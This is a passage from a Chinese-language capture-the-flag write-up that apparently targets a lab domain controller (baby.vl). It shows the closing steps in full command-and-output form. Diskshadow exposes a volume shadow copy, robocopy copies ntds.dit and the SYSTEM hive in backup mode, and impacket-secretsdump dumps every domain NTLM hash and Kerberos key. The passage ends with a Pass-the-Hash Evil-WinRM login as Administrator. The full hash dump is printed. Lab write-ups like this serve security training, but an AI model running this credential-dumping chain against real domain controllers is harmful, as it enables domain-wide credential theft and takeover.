Add-Content C:\Windows\Temp\shadow.dsh "expose %cdrive% Z:"
Add-Content C:\Windows\Temp\shadow.dsh "end backup"
```

再次运行：

```powershell
*Evil-WinRM* PS C:\Windows\Temp> diskshadow /s C:\Windows\Temp\shadow.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  6/4/2026 9:09:03 AM

-> set verbose on
-> set metadata C:\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.

* Including writer "Task Scheduler Writer":
        + Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
        + Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
        + Adding component: \PerformanceCounters

* Including writer "System Writer":
        + Adding component: \System Files
        + Adding component: \Win32 Services Files

* Including writer "ASR Writer":
        + Adding component: \ASR\ASR
        + Adding component: \Volumes\Volume{711fc68a-0000-0000-0000-100000000000}
        + Adding component: \Disks\harddisk0
        + Adding component: \BCD\BCD

* Including writer "Registry Writer":
        + Adding component: \Registry

* Including writer "DFS Replication service writer":
        + Adding component: \SYSVOL\8D6E7361-AC28-4EC5-9914-ACB6AE407BCB-2EB58465-8BD4-4748-9135-FE1B23D5A20B

* Including writer "COM+ REGDB Writer":
        + Adding component: \COM+ REGDB

* Including writer "WMI Writer":
        + Adding component: \WMI

* Including writer "NTDS":
        + Adding component: \C:_Windows_NTDS\ntds
Alias cdrive for shadow ID {a4ea4164-27ff-4ecf-97f6-bcd245418d50} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {c10f9c79-27a9-4cb3-9693-fb1cb067425e} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file BCDocument.xml into .cab file meta.cab
Inserted file WM0.xml into .cab file meta.cab
Inserted file WM1.xml into .cab file meta.cab
Inserted file WM2.xml into .cab file meta.cab
Inserted file WM3.xml into .cab file meta.cab
Inserted file WM4.xml into .cab file meta.cab
Inserted file WM5.xml into .cab file meta.cab
Inserted file WM6.xml into .cab file meta.cab
Inserted file WM7.xml into .cab file meta.cab
Inserted file WM8.xml into .cab file meta.cab
Inserted file WM9.xml into .cab file meta.cab
Inserted file WM10.xml into .cab file meta.cab
Inserted file DisF884.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {c10f9c79-27a9-4cb3-9693-fb1cb067425e}

        * Shadow copy ID = {a4ea4164-27ff-4ecf-97f6-bcd245418d50}               %cdrive%
                - Shadow copy set: {c10f9c79-27a9-4cb3-9693-fb1cb067425e}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 6/4/2026 9:09:32 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% Z:
-> %cdrive% = {a4ea4164-27ff-4ecf-97f6-bcd245418d50}
The shadow copy was successfully exposed as Z:\.
-> end backup
```

这次脚本都运行完成了。

根据脚本，卷影副本会被挂载为 `Z:` 盘，直接从 `Z:` 复制：

```powershell
*Evil-WinRM* PS C:\Windows\Temp> robocopy Z:\Windows\NTDS C:\Windows\Temp ntds.dit /B

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, June 4, 2026 9:14:55 AM
   Source : Z:\Windows\NTDS\
     Dest : C:\Windows\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    Z:\Windows\NTDS\
            New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           19,878,218 Bytes/sec.
   Speed :            1,137.441 MegaBytes/min.
   Ended : Thursday, June 4, 2026 9:14:56 AM
```

同样的方式，把 SYSTEM 也备份出来：

```powershell
*Evil-WinRM* PS C:\Windows\Temp> robocopy Z:\Windows\System32\config\ C:\Windows\Temp SYSTEM /B

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, June 4, 2026 9:17:22 AM
   Source : Z:\Windows\System32\config\
     Dest : C:\Windows\Temp\

    Files : SYSTEM

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    Z:\Windows\System32\config\
            New File              19.9 m        SYSTEM
------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   19.95 m   19.95 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           26,256,542 Bytes/sec.
   Speed :            1,502.411 MegaBytes/min.
   Ended : Thursday, June 4, 2026 9:17:23 AM
```

为什么还需要 SYSTEM 呢？

NTDS.dit 里存储的域用户密码 hash（NTLM、Kerberos 等）是用从 SYSTEM hive 提取的 Bootkey 加密的。没有 SYSTEM，你就拿不到解密所需的密钥材料。

将两个文件都下载到本地：

```powershell
*Evil-WinRM* PS C:\Windows\Temp> download ntds.dit

Info: Downloading C:\Windows\Temp\ntds.dit to ntds.dit

Info: Download successful!
```

```powershell
*Evil-WinRM* PS C:\Windows\Temp> download SYSTEM

Info: Downloading C:\Windows\Temp\SYSTEM to SYSTEM

Info: Download successful!
```

本地提取 Hash：

```bash
$impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:626148be4a201edf2a6751a19e8e661a:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
BABYDC$:des-cbc-md5:8fef68979223d645
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:7753cb4f2134be6bb40b5d351c9550ebc6d693d4836b6f05c31d9145b75a8e9b
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:73e7dddc84ebb2fd9d7691f6f3749d0d
baby.vl\Caroline.Robinson:des-cbc-md5:645d2c29d5759bcd
[*] Cleaning up...
```

域控上的管理员的 NTLM-Hash：

```
ee4457ae59f1e3fbd764e33d9cef123d
```

我们之前抓取流量，看到 winrm 采用的是 negotiate 认证，换言之，允许我们使用 NTLM 认证。

我们上一步得到的 NTLM-Hash 可以直接做 Pass-the-Hash 去获得远程 Powershell：

```bash
$evil-winrm -H ee4457ae59f1e3fbd764e33d9cef123d -u Administrator -i 10.129.234.71

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
baby\administrator
```